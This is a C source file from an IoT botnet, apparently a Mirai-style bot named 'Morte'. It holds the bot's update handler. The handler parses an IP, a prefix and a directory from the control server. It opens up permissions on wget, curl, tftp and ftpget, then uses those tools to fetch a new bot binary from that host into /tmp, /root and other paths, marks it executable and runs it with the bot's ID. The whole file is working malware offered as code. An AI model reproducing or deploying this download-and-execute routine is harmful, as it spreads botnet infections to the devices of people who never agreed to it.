#include "headers/killer.h"
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <sys/stat.h>

#include "headers/update.h"
#include "headers/util.h"
#include "headers/includes.h"

extern int fd_ctrl;
extern char bot_id[32];

#ifndef Morte_arch
#define Morte_arch "???"
#endif

const char *commands[] = {
    "/sbin/wget", "/usr/sbin/wget", "/bin/wget", "/usr/bin/wget",
    "/sbin/curl", "/usr/sbin/curl", "/bin/curl", "/usr/bin/curl",
    "/sbin/ftpget", "/usr/sbin/ftpget", "/bin/ftpget", "/usr/bin/ftpget",
    "/sbin/tftp", "/usr/sbin/tftp", "/bin/tftp", "/usr/bin/tftp",
};

void enable_commands(void)
{
    int num_commands = sizeof(commands) / sizeof(commands[0]);
    for (int i = 0; i < num_commands; i++)
    {
        if (chmod(commands[i], 0755) == -1)
        {
#ifdef DEBUG
            perror("[Morte_command] chmod 755 failed");
#endif
        }
        
    }

#ifdef DEBUG
    printf("[Morte_command] Permissions on commands set to 0755.\n");
#endif

}

void disable_commands(void)
{
    int num_commands = sizeof(commands) / sizeof(commands[0]);
    for (int i = 0; i < num_commands; i++)
    {
        if (chmod(commands[i], 0755) == -1)
        {
#ifdef DEBUG
            perror("[Morte_command] chmod 755 failed");
#endif
        }
        
    }

#ifdef DEBUG
    printf("[Morte_command] Permissions on commands set to 0755.\n");
#endif

}

void handle_update(char *buf, int len)
{
    char ip[17] = {0};
    char bin_prefix[33] = {0};
    char bin_directory[33] = {0};
    uint8_t ip_len, prefix_len, dir_len;

    if (len < 1) return;
    ip_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (len < ip_len) return;
    util_memcpy(ip, buf, ip_len);
    buf += ip_len;
    len -= ip_len;
    
    if (len < 1) return;
    prefix_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (len < prefix_len) return;
    util_memcpy(bin_prefix, buf, prefix_len);
    buf += prefix_len;
    len -= prefix_len;

    if (len < 1) return;
    dir_len = (uint8_t)*buf++;
    len -= sizeof(uint8_t);
    if (len < dir_len) return;
    util_memcpy(bin_directory, buf, dir_len);
    buf += dir_len;
    len -= dir_len;

#ifdef DEBUG
    printf("[Morte_update] Received update. IP=%s, Prefix=%s, Dir=%s\n", ip, bin_prefix, bin_directory);
#endif

    pid_t pid = fork();
    if (pid == -1)
        return;
    if (pid > 0)
    {
        wait(NULL);
        return;
    }

    char *locations[] = {"/tmp/", "/var/run/", "/mnt/", "/root/", "/var/", "/var/tmp/"};
    char new_binary_path[128];
    char command[512];
    int success = 0;
    int i;
    
    char full_prefix[64];
    snprintf(full_prefix, sizeof(full_prefix), "%s%s", bin_prefix, Morte_arch);

    enable_commands();
    for (i = 0; i < sizeof(locations)/sizeof(locations[0]); i++)
    {
        snprintf(new_binary_path, sizeof(new_binary_path), "%s%s", locations[i], full_prefix);

        snprintf(command, sizeof(command), "wget http://%s/%s/%s -O %s", ip, bin_directory, full_prefix, new_binary_path);
        system(command);
        if (access(new_binary_path, F_OK) != -1) { success = 1; break; }

        snprintf(command, sizeof(command), "curl -o %s http://%s/%s/%s", new_binary_path, ip, bin_directory, full_prefix);
        system(command);
        if (access(new_binary_path, F_OK) != -1) { success = 1; break; }

        snprintf(command, sizeof(command), "tftp %s -c get %s %s", ip, full_prefix, new_binary_path);
        system(command);
        if (access(new_binary_path, F_OK) != -1) { success = 1; break; }

        snprintf(command, sizeof(command), "cd %s && tftp -g -r %s %s", locations[i], full_prefix, ip);
        system(command);
        if (access(new_binary_path, F_OK) != -1) { success = 1; break; }

        snprintf(command, sizeof(command), "ftpget -v -u anonymous -p anonymous -P 21 %s %s %s", ip, new_binary_path, full_prefix);
        system(command);
        if (access(new_binary_path, F_OK) != -1) { success = 1; break; }
    }

    if (success)
    {
#ifdef DEBUG
        printf("[Morte_update] Download successful to %s\n", new_binary_path);
#endif
        disable_commands();
        chmod(new_binary_path, 0777);

        if (fd_ctrl != -1)
        {
            close(fd_ctrl);
#ifdef DEBUG
            printf("[Morte_update] Instance lock released (fd_ctrl closed).\n");
#endif
        }

#ifdef DEBUG
        printf("[Morte_update] Executing new binary: %s with id: %s\n", new_binary_path, bot_id);
#endif
        char *args[] = {new_binary_path, bot_id, NULL};
        execv(new_binary_path, args);

#ifdef DEBUG
        perror("[Morte_update] execv failed");
#endif
        exit(1);
    }
    else
    {
#ifdef DEBUG
        printf("[Morte_update] Download failed.\n");
#endif
        exit(1);
    }
}
